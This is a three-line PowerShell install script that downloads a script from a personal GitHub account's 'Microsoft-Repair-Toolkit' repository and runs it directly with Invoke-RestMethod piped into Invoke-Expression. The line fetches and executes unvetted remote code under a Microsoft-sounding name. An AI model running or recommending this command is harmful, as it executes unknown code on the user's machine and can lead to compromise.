# install.ps1
$scriptUrl = "https://raw.githubusercontent.com/xiaoguaia/Microsoft-Repair-Toolkit/master/win_repair_tool.ps1"
Invoke-RestMethod $scriptUrl | Invoke-Expression
